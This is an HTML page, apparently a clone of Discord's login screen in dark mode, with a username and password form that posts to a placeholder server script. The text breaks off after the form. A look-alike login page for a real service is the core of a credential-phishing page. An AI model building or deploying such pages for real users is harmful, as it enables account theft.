<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login - Dark Mode</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #36393F; /* Dark background color */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #2F3136; /* Darker container background */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            width: 300px;
            text-align: center;
            position: relative;
        }
        .login-container:before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://cdn.discordapp.com/attachments/874992455782266152/992284076303781120/7f10e0a6-b0c3-4df2-836a-1280d00017bb.png'); /* Replace with your background image */
            background-size: cover;
            opacity: 0.2; /* Adjust opacity as needed */
            z-index: -1;
            border-radius: 8px;
        }
        .login-container h1 {
            color: #7289DA; /* Discord's brand color */
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            text-align: left;
            margin-bottom: 5px;
            color: #FFFFFF; /* White text color */
        }
        .input-group input[type="text"],
        .input-group input[type="password"] {
            width: 100%;
            padding: 8px;
            font-size: 16px;
            border-radius: 4px;
            border: 1px solid #4E535D; /* Darker border color */
            background-color: #40444B; /* Darker input background */
            color: #FFFFFF; /* White text color */
            box-sizing: border-box;
        }
        .input-group input[type="submit"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            background-color: #7289DA; /* Discord's brand color */
            color: #FFFFFF; /* White text color */
            cursor: pointer;
            border-radius: 4px;
        }
        .input-group input[type="submit"]:hover {
            background-color: #627EB7; /* Darker shade for hover effect */
        }
        .qr-code {
            margin-top: 20px;
            color: #FFFFFF;
        }
        .qr-code img {
            width: 100px; /* Adjust size as needed */
            height: 100px; /* Adjust size as needed */
            border-radius: 4px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Discord Login</h1>
        <form action="your_server_script_here" method="POST">
            <div class="input-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="input-group">
                <input type="submit" value="Login">
            </div>
        </form>
